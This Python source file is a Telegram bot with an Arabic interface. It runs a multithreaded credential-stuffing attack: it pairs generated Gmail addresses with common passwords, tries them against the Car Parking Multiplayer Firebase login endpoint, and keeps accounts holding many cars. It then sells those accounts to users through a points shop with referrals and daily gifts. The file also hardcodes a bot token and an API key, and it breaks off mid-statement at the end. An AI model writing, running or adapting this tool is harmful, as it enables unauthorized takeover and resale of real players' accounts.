import urllib.request
import urllib.parse
import json
import random
import time
import sys
import os
import threading
import string
import logging
from datetime import datetime
from flask import Flask
import telebot
from telebot import types
from telebot.apihelper import ApiTelegramException

# ================== الإعدادات العامة ==================
BOT_TOKEN = "8807194549:AAGcUNewT82vYW7rxdngAdSYOTlvCvYUOo8"
ADMIN_ID = "7075895496"
ADMIN_USERNAME = "@XOREYT"
THREADS = 100
BOT_LINK = "https://t.me/Xoregrops_bot"

# ================== إعدادات الملفات ==================
DB_USERS = "users.json"
DB_CHANNELS = "channels.json"
DB_STOCK = "stock.txt"
DB_BANNED = "banned.json"
DB_LOGS = "logs.txt"
DB_SETTINGS = "settings.json"

# ================== إعداد السجلات ==================
logging.basicConfig(
    filename=DB_LOGS,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def log_action(action, user_id, details=""):
    logging.info(f"ACTION: {action} | USER: {user_id} | DETAILS: {details}")

# ================== دوال قاعدة البيانات ==================
def load_json(filename, default=None):
    if default is None: default = {}
    if os.path.exists(filename):
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                return json.load(f)
        except: return default
    return default

def save_json(filename, data):
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
        return True
    except Exception as e:
        logging.error(f"Failed to save {filename}: {e}")
        return False

users = load_json(DB_USERS)
channels = load_json(DB_CHANNELS)
banned_users = load_json(DB_BANNED, [])
settings = load_json(DB_SETTINGS, {
    "daily_gift": 1,
    "ref_points": 5,
    "min_cars": 30,
    "auto_hunt": False,
    "maintenance": False
})

# ================== الحالة العامة ==================
good = 0
bad = 0
running = False
STOP_FLAG = threading.Event()
lock = threading.Lock()
flood_control = {}
flood_lock = threading.Lock()

# ================== Flask ==================
app = Flask(__name__)

@app.route("/")
def index():
    return "Mehdi's Car Parking Bot - System Online"

def keep_alive():
    def run():
        try:
            app.run(host="0.0.0.0", port=10000, debug=False)
        except Exception as e:
            logging.error(f"Flask Error: {e}")
    t = threading.Thread(target=run, daemon=True)
    t.start()

# ================== البوت ==================
bot = telebot.TeleBot(BOT_TOKEN)

# ================== دوال مساعدة ==================
def is_banned(user_id):
    return str(user_id) in banned_users

def is_admin(user_id):
    return str(user_id) == ADMIN_ID

def check_flood(user_id):
    now = time.time()
    uid = str(user_id)
    with flood_lock:
        if uid not in flood_control:
            flood_control[uid] = []
        flood_control[uid] = [t for t in flood_control[uid] if now - t < 5]
        if len(flood_control[uid]) >= 5:
            return False
        flood_control[uid].append(now)
    return True

def get_user(user_id):
    uid = str(user_id)
    if uid not in users:
        users[uid] = {
            "points": 0,
            "refs": 0,
            "referred_by": None,
            "joined": time.time(),
            "last_daily": 0,
            "hits_bought": 0,
            "total_earned": 0,
            "level": 1
        }
        save_json(DB_USERS, users)
    return users[uid]

def add_points(user_id, amount, reason="unknown"):
    uid = str(user_id)
    user = get_user(uid)
    user["points"] += amount
    user["total_earned"] += amount if amount > 0 else 0
    
    new_level = 1 + (user["total_earned"] // 10)
    if new_level > user["level"]:
        user["level"] = new_level
        try:
            bot.send_message(uid, f"🎉 مبروك! لقد وصلت للمستوى {new_level}!")
        except: pass
        
    save_json(DB_USERS, users)
    log_action("ADD_POINTS", uid, f"+{amount} ({reason})")
    return True

def check_forced_sub(message):
    if is_admin(message.from_user.id): return True
    if not channels: return True
    
    not_joined = []
    for ch_id, ch_name in channels.items():
        try:
            member = bot.get_chat_member(ch_id, message.from_user.id)
            if member.status in ['left', 'kicked']:
                not_joined.append(ch_name)
        except Exception as e:
            not_joined.append(ch_name)
            
    if not_joined:
        markup = types.InlineKeyboardMarkup(row_width=1)
        for ch_id, ch_name in channels.items():
            try:
                chat_info = bot.get_chat(ch_id)
                link = chat_info.invite_link or f"https://t.me/{chat_info.username}"
                markup.add(types.InlineKeyboardButton(text=f"📢 {ch_name}", url=link))
            except: pass
        markup.add(types.InlineKeyboardButton(text="✅ تحقق من الاشتراك", callback_data="check_sub"))
        bot.send_message(message.chat.id, "⚠️ <b>عذراً، يجب عليك الاشتراك في القنوات التالية أولاً:</b>", reply_markup=markup, parse_mode="HTML")
        return False
    return True

def get_main_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    if is_admin(user_id):
        markup.add("▶️ بدء الصيد", "🛑 إيقاف الصيد")
        markup.add("🏪 المتجر", "💎 نقاطي")
        markup.add("📢 إذاعة", "⚙️ إدارة القنوات")
        markup.add("📊 الإحصائيات", "🛠️ لوحة التحكم")
        markup.add("📜 سجل العمليات", "🚫 إدارة الحظر")
        markup.add("⚙️ الإعدادات", "📤 تصدير البيانات")
        markup.add("🔄 تحديث", "ℹ️ معلومات البوت")
    else:
        markup.add("🏪 المتجر", "💎 نقاطي")
        markup.add("🎁 هدية يومية", "🔗 رابط الإحالة")
        markup.add("🏆 المتصدرين", "📊 مستواي")
        markup.add("ℹ️ معلومات البوت", "🔄 تحديث")
    return markup

# ================== دوال الصيد ==================
def http_post(url, json_data=None, headers=None, timeout=10):
    try:
        data = json.dumps(json_data).encode('utf-8') if json_data else None
        req = urllib.request.Request(url, data=data, method='POST')
        if headers:
            for k, v in headers.items(): req.add_header(k, v)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode('utf-8', errors='ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='ignore')
    except: return 0, ''

def http_get(url, params=None, timeout=5):
    try:
        if params:
            url = url + '?' + urllib.parse.urlencode(params)
        req = urllib.request.Request(url, method='GET')
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode('utf-8', errors='ignore')
    except: return 0, ''

def get_car_count(id_token):
    try:
        url = "https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2"
        headers = {
            "authorization": f"Bearer {id_token}",
            "content-type": "application/json",
            "user-agent": "CarParking/265 CFNetwork/3860.700.1 Darwin/25.6.0"
        }
        status, body = http_post(url, {"data": None}, headers, timeout=10)
        if status == 200:
            data = json.loads(body)
            if 'result' in data:
                cars_data = json.loads(data['result'])
                if isinstance(cars_data, list): return len(cars_data)
                elif isinstance(cars_data, dict): return len(cars_data.get('cars', []))
    except: pass
    return 0

def check_account(email, password):
    global good, bad
    try:
        login_url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
        login_payload = {
            "email": email,
            "password": password,
            "returnSecureToken": True,
            "clientType": "CLIENT_TYPE_IOS"
        }
        login_headers = {
            "User-Agent": "CarParking/265 CFNetwork/3860.700.1 Darwin/25.6.0",
            "Content-Type": "application/octet-stream",
            "X-Unity-Version": "2022.3.62f2"
        }
        
        status, body = http_post(login_url, login_payload, login_headers, timeout=10)
        if status == 200:
            # تم إصلاح هذا السطر
            res_json = json.loads(body)
            id_token = res_json.get('idToken')
            if id_token:
                car_count = get_car_count(id_token)
                if car_count >= settings.get("min_cars", 30):
                    with lock: good += 1
                    with open(DB_STOCK, 'a', encoding='utf-8') as f:
                        f.write(f'{email}:{password}:{car_count}\n')
                    log_action("HIT_FOUND", "SYSTEM", f"{email} - {car_count} cars")
                else:
                    with lock: bad += 1
            else:
                with lock: bad += 1
        else:
            with lock: bad += 1
    except: pass

FIRST_NAMES = ['john', 'mike', 'sara', 'ali', 'omar', 'lina', 'adam', 'huda', 'kareem', 'noor',
               'ahmed', 'mona', 'yousef', 'rana', 'khaled', 'dina', 'sami', 'lara', 'zaid', 'aya',
               'mohamed', 'fatima', 'hassan', 'zainab', 'hussein', 'maryam', 'abbas', 'nour']
               
WORDS = ['cool', 'fast', 'dark', 'king', 'star', 'fire', 'wolf', 'lion', 'sky', 'pro',
         'hero', 'ghost', 'ninja', 'tiger', 'shadow', 'storm', 'blade', 'cyber', 'alpha', 'omega',
         'super', 'mega', 'ultra', 'hyper', 'master', 'legend', 'epic', 'elite', 'prime', 'max']

PASSWORDS = ['12345678', '123456789', 'password', '123456', '123123', '1234567', '00000000', 
             '12345', 'qwerty', '1234567890', 'asdfghjkl', 'zxcvbnm', 'qwertyuiop', '1q2w3e4r',
             'abc123', 'password1', 'iloveyou', 'admin123', 'welcome', 'football']

def generate_credentials():
    pattern = random.randint(0, 4)
    if pattern == 0: 
        name = random.choice(FIRST_NAMES) + ''.join(random.choices(string.digits, k=random.randint(1, 4)))
    elif pattern == 1: 
        name = random.choice(FIRST_NAMES) + random.choice(['_', '.']) + random.choice(FIRST_NAMES)
    elif pattern == 2: 
        name = random.choice(WORDS) + random.choice(['', '123', '2023', '2024', '1', '00'])
    elif pattern == 3: 
        name = random.choice(FIRST_NAMES) + random.choice(WORDS)
    else: 
        name = 'user' + str(random.randint(1000, 999999))
    return name.lower() + '@gmail.com', random.choice(PASSWORDS)

def worker():
    while not STOP_FLAG.is_set():
        email, password = generate_credentials()
        check_account(email, password)
        time.sleep(random.uniform(0.001, 0.01))

def run_checker():
    global running, good, bad
    with lock: good = 0; bad = 0
    running = True
    STOP_FLAG.clear()
    log_action("HUNT_START", ADMIN_ID, f"Threads: {THREADS}")
    
    for _ in range(THREADS):
        threading.Thread(target=worker, daemon=True).start()
        
    while running and not STOP_FLAG.is_set():
        time.sleep(10)
        
    log_action("HUNT_STOP", ADMIN_ID, f"Good: {good}, Bad: {bad}")

# ================== أوامر عامة ==================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_banned(message.from_user.id):
        bot.reply_to(message, "🚫 أنت محظور من استخدام البوت.")
        return
        
    if settings.get("maintenance") and not is_admin(message.from_user.id):
        bot.reply_to(message, "🛠️ البوت في وضع الصيانة حالياً، يرجى المحاولة لاحقاً.")
        return

    if not check_forced_sub(message): return
    
    user = get_user(message.from_user.id)
    ref_id = message.text.split()[1] if len(message.text.split()) > 1 else None
    
    if ref_id and ref_id != str(message.from_user.id) and user["referred_by"] is None:
        try:
            if ref_id in users:
                user["referred_by"] = ref_id
                user["refs"] += 1
                users[ref_id]["refs"] += 1
                add_points(ref_id, settings.get("ref_points", 5), "referral")
                save_json(DB_USERS, users)
                try: 
                    bot.send_message(int(ref_id), f"🎉 شخص جديد دخل من رابطك! حصلت على {settings.get('ref_points', 5)} نقاط.")
                except: pass
        except Exception as e:
            logging.error(f"Referral error: {e}")

    text = (
        f"👋 <b>أهلاً بك يا {message.from_user.first_name} في بوت مهدي للصيد!</b>\n\n"
        f"💎 <b>نقاطك:</b> {user['points']}\n"
        f"📈 <b>مستواك:</b> {user['level']}\n"
        f"👥 <b>إحالاتك:</b> {user['refs']}\n\n"
        f"استخدم الأزرار بالأسفل للتنقل."
    )
    bot.send_message(message.chat.id, text, reply_markup=get_main_keyboard(message.from_user.id), parse_mode="HTML")
    log_action("START", message.from_user.id)

@bot.message_handler(func=lambda message: message.text == "🏪 المتجر")
def shop(message):
    if not check_flood(message.from_user.id): return
    user = get_user(message.from_user.id)
    text = (
        f"🛒 <b>متجر الصيد</b>\n\n"
        f"💎 رصيدك الحالي: <b>{user['points']} نقطة</b>\n\n"
        f"🚗 <b>صيدة واحدة:</b> 1 نقطة\n"
        f"📦 <b>5 صيدات:</b> 4 نقاط\n"
        f"🎁 <b>10 صيدات:</b> 7 نقاط\n\n"
        f"اختر ما تريد شراءه:"
    )
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🚗 صيدة واحدة (1 نقطة)", callback_data="buy_1"))
    markup.add(types.InlineKeyboardButton("📦 5 صيدات (4 نقاط)", callback_data="buy_5"))
    markup.add(types.InlineKeyboardButton("🎁 10 صيدات (7 نقاط)", callback_data="buy_10"))
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith("buy_"))
def buy_hit(call):
    amount = int(call.data.split("_")[1])
    cost = {1: 1, 5: 4, 10: 7}[amount]
    
    user = get_user(call.from_user.id)
    if user["points"] < cost:
        bot.answer_callback_query(call.id, f"❌ تحتاج {cost} نقاط، رصيدك {user['points']}.", show_alert=True)
        return
    
    try:
        with open(DB_STOCK, 'r', encoding='utf-8') as f: lines = f.readlines()
        if len(lines) < amount:
            bot.answer_callback_query(call.id, f"⚠️ المخزن لا يحتوي إلا على {len(lines)} حسابات.", show_alert=True)
            return
        
        bought = lines[:amount]
        with open(DB_STOCK, 'w', encoding='utf-8') as f: f.writelines(lines[amount:])
        
        user["points"] -= cost
        user["hits_bought"] += amount
        save_json(DB_USERS, users)
        
        hits_text = "".join(bought)
        bot.send_message(call.from_user.id, f"✅ <b>تم الشراء بنجاح!</b>\n\n<code>{hits_text}</code>", parse_mode="HTML")
        bot.answer_callback_query(call.id, "تم الشراء بنجاح.")
        log_action("BUY_HITS", call.from_user.id, f"{amount} hits for {cost} pts")
    except Exception as e:
        bot.answer_callback_query(call.id, "⚠️ خطأ في جلب الصيدات.", show_alert=True)

@bot.message_handler(func=lambda message: message.text == "💎 نقاطي")
def my_points(message):
    user = get_user(message.from_user.id)
    text = (
        f"💎 <b>معلومات حسابك:</b>\n\n"
        f"👤 الاسم: {message.from_user.first_name}\n"
        f"🆔 الآيدي: <code>{message.from_user.id}</code>\n"
        f"⭐ النقاط: <b>{user['points']}</b>\n"
        f"📈 المستوى: <b>{user['level']}</b>\n"
        f"👥 الإحالات: <b>{user['refs']}</b>\n"
        f"🛒 الصيدات المشتراة: <b>{user['hits_bought']}</b>\n"
        f"📅 تاريخ الانضمام: {datetime.fromtimestamp(user['joined']).strftime('%Y-%m-%d')}"
    )
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text == "🔗 رابط الإحالة")
def ref_link(message):
    link = f"{BOT_LINK}?start={message.from_user.id}"
    user = get_user(message.from_user.id)
    text = (
        f"🔗 <b>رابط الإحالة الخاص بك:</b>\n\n"
        f"<code>{link}</code>\n\n"
        f"👈 شاركه مع أصدقائك.\n"
        f"💰 تحصل على <b>{settings.get('ref_points', 5)} نقاط</b> لكل شخص يدخل من رابطك.\n"
        f"👥 إحالاتك الحالية: <b>{user['refs']}</b>"
    )
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text == "🎁 هدية يومية")
def daily_gift(message):
    user = get_user(message.from_user.id)
    now = time.time()
    if now - user["last_daily"] < 86400:
        remain = int(86400 - (now - user["last_daily"]))
        hrs = remain // 3600; mins = (remain % 3600) // 60
        bot.reply_to(message, f"⚠️ لقد أخذت هديتك اليوم.\n⏳ متبقي: <b>{hrs} ساعة و {mins} دقيقة</b>.", parse_mode="HTML")
        return
    
    gift = settings.get("daily_gift", 1)
    user["last_daily"] = now
    add_points(message.from_user.id, gift, "daily_gift")
    bot.reply_to(message, f"🎁 <b>مبروك!</b> حصلت على <b>{gift} نقطة</b> من الهدية اليومية.\n💎 رصيدك الآن: <b>{user['points']}</b>", parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text == "🏆 المتصدرين")
def top_users(message):
    sorted_users = sorted(users.items(), key=lambda x: x[1].get("total_earned", 0), reverse=True)[:10]
    text = "🏆 <b>أفضل 10 مستخدمين:</b>\n\n"
    for i, (uid, data) in enumerate(sorted_users, 1):
        try:
            name = bot.get_chat(int(uid)).first_name
        except: name = "Unknown"
        text += f"{i}. {name} - ⭐ {data.get('points', 0)} - 🏅 {data.get('total_earned', 0)}\n"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text == "📊 مستواي")
def my_level(message):
    user = get_user(message.from_user.id)
    next_lvl = user["level"] * 10
    text = f"📊 <b>مستواك:</b> {user['level']}\n⭐ نقاطك: {user['points']}\n🎯 التالي: {next_lvl} نقطة."
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text == "ℹ️ معلومات البوت")
def bot_info(message):
    text = (
        f"🤖 <b>بوت Car Parking</b>\n\n"
        f"👨‍💻 المطور: مهدي ({ADMIN_USERNAME})\n"
        f"⚡ السرعة: {THREADS} خيط\n"
        f"🎯 الحد الأدنى للسيارات: {settings.get('min_cars', 30)}\n"
        f"👥 عدد المستخدمين: {len(users)}\n"
        f"📦 المخزن: {sum(1 for _ in open(DB_STOCK)) if os.path.exists(DB_STOCK) else 0} حساب"
    )
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text == "🔄 تحديث")
def refresh_ui(message):
    bot.send_message(message.chat.id, "🔄 تم التحديث!", reply_markup=get_main_keyboard(message.from_user.id))

# ================== أوامر الأدمن ==================
@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "▶️ بدء الصيد")
def admin_start(message):
    global running
    if running: return bot.reply_to(message, "⚠️ الصيد شغال بالفعل.")
    
    msg = bot.reply_to(message, "⏳ جاري تجهيز الصيد...")
    chat_id = msg.chat.id; msg_id = msg.message_id
    
    def update_progress():
        for i in range(1, 101):
            if STOP_FLAG.is_set(): break
            try:
                filled = "█" * (i // 10) + "░" * (10 - i // 10)
                bot.edit_message_text(f"⏳ <b>جاري الصيد...</b>\n\n[{filled}] {i}%", chat_id, msg_id, parse_mode="HTML")
            except: pass
            time.sleep(1.5)
        if not STOP_FLAG.is_set():
            bot.edit_message_text("✅ <b>تم بدء الصيد في الخلفية!</b>", chat_id, msg_id, parse_mode="HTML")

    threading.Thread(target=run_checker, daemon=True).start()
    threading.Thread(target=update_progress, daemon=True).start()

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "🛑 إيقاف الصيد")
def admin_stop(message):
    global running
    STOP_FLAG.set(); running = False
    bot.reply_to(message, "🛑 تم إيقاف الصيد. المخزن جاهز للبيع.")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📢 إذاعة")
def admin_broadcast_start(message):
    msg = bot.reply_to(message, "📢 أرسل الرسالة الآن (نص، صورة، ملف..):")
    bot.register_next_step_handler(msg, admin_broadcast_send)

def admin_broadcast_send(message):
    bot.reply_to(message, "⏳ جاري الإرسال للجميع...")
    count = 0; failed = 0
    for uid in list(users.keys()):
        try:
            bot.copy_message(chat_id=uid, from_chat_id=message.chat.id, message_id=message.message_id)
            count += 1
            time.sleep(0.05)
        except: failed += 1
    bot.send_message(ADMIN_ID, f"✅ تم الإرسال إلى {count} شخص.\n❌ فشل: {failed}")
    log_action("BROADCAST", ADMIN_ID, f"Sent: {count}")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "⚙️ إدارة القنوات")
def admin_channels(message):
    text = "⚙️ <b>إدارة الاشتراك الإجباري</b>\n\nالقنوات الحالية:\n"
    if not channels: text += "لا توجد قنوات.\n"
    for c_id, c_n in channels.items():
        text += f"- {c_n} (<code>{c_id}</code>)\n"
    text += "\nلإضافة قناة:\n<code>/addchannel @username</code>\nلحذف قناة:\n<code>/delchannel ID</code>"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['addchannel'])
def add_channel(message):
    if not is_admin(message.from_user.id): return
    try:
        ch = message.text.split(maxsplit=1)[1]
        if ch.startswith('@'):
            chat_info = bot.get_chat(ch)
            channels[str(chat_info.id)] = chat_info.title
        else:
            channels[str(ch)] = "قناة " + str(ch)
        save_json(DB_CHANNELS, channels)
        bot.reply_to(message, "✅ تم إضافة القناة.")
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: تأكد أن البوت مشرف في القناة.\n{e}")

@bot.message_handler(commands=['delchannel'])
def del_channel(message):
    if not is_admin(message.from_user.id): return
    try:
        ch = message.text.split(maxsplit=1)[1]
        if ch in channels:
            del channels[ch]
            save_json(DB_CHANNELS, channels)
            bot.reply_to(message, "✅ تم حذف القناة.")
        else:
            bot.reply_to(message, "❌ القناة غير موجودة.")
    except:
        bot.reply_to(message, "❌ الاستخدام: /delchannel ID")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📊 الإحصائيات")
def admin_stats(message):
    total_users = len(users)
    total_points = sum(u.get("points", 0) for u in users.values())
    total_hits = sum(1 for _ in open(DB_STOCK)) if os.path.exists(DB_STOCK) else 0
    text = (
        f"📊 <b>إحصائيات البوت:</b>\n\n"
        f"👥 المستخدمين: {total_users}\n"
        f"⭐ مجموع النقاط: {total_points}\n"
        f"📦 المخزن: {total_hits}\n"
        f"🏃 الحالة: {'شغال' if running else 'متوقف'}\n"
        f"💥 الصيد: {good}\n"
        f"❌ الفشل: {bad}"
    )
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📜 سجل العمليات")
def admin_logs(message):
    try:
        with open(DB_LOGS, 'r', encoding='utf-8') as f:
            lines = f.readlines()[-30:]
        text = "📜 <b>آخر 30 عملية:</b>\n\n<code>" + "".join(lines) + "</code>"
        if len(text) > 4000:
            text = text[:4000]
        bot.reply_to(message, text, parse_mode="HTML")
    except:
        bot.reply_to(message, "❌ لا يوجد سجل.")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "🚫 إدارة الحظر")
def admin_ban(message):
    text = "🚫 <b>إدارة الحظر</b>\n\nالأوامر:\n<code>/ban USER_ID</code>\n<code>/unban USER_ID</code>\n\nالمحظورين: " + str(len(banned_users))
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id): return
    try:
        uid = message.text.split()[1]
        if uid not in banned_users:
            banned_users.append(uid)
            save_json(DB_BANNED, banned_users)
            bot.reply_to(message, f"✅ تم حظر {uid}.")
        else:
            bot.reply_to(message, "⚠️ محظور مسبقاً.")
    except:
        bot.reply_to(message, "❌ الاستخدام: /ban ID")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id): return
    try:
        uid = message.text.split()[1]
        if uid in banned_users:
            banned_users.remove(uid)
            save_json(DB_BANNED, banned_users)
            bot.reply_to(message, f"✅ تم إلغاء حظر {uid}.")
        else:
            bot.reply_to(message, "⚠️ غير محظور.")
    except:
        bot.reply_to(message, "❌ الاستخدام: /unban ID")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "⚙️ الإعدادات")
def admin_settings(message):
    text = (
        f"⚙️ <b>الإعدادات:</b>\n\n"
        f"🎁 الهدية اليومية: {settings.get('daily_gift')}\n"
        f"👥 نقاط الإحالة: {settings.get('ref_points')}\n"
        f"🚗 الحد الأدنى للسيارات: {settings.get('min_cars')}\n"
        f"🛠️ الصيانة: {settings.get('maintenance')}\n\n"
        f"لتغيير: <code>/set daily_gift 2</code>"
    )
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['set'])
def admin_set(message):
    if not is_admin(message.from_user.id): return
    try:
        parts = message.text.split()
        key, val = parts[1], parts[2]
        if key in ["daily_gift", "ref_points", "min_cars"]:
            settings[key] = int(val)
        elif key == "maintenance":
            settings[key] = val.lower() == "true"
        else:
            return bot.reply_to(message, "❌ مفتاح غير صحيح.")
        save_json(DB_SETTINGS, settings)
        bot.reply_to(message, f"✅ تم تحديث {key} إلى {val}.")
    except:
        bot.reply_to(message, "❌ الاستخدام: /set KEY VALUE")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📤 تصدير البيانات")
def admin_export(message):
    try:
        with open(DB_STOCK, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="📦 الحسابات في المخزن")
        with open(DB_USERS, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="👥 بيانات المستخدمين")
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
def check_sub_cb(call):
    if check_forced_sub(call.message):
        bot.send_message(call.from_user.id, "✅ تم التحقق! أرسل /start للبدء.")
    else:
        bot.answer_callback_query(call.id, "❌ لم تشترك بعد.", show_alert=True)

# ================== تشغيل ==================
if __name__ == "__main__":
    keep_alive()
    logging.info("Bot Started")
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
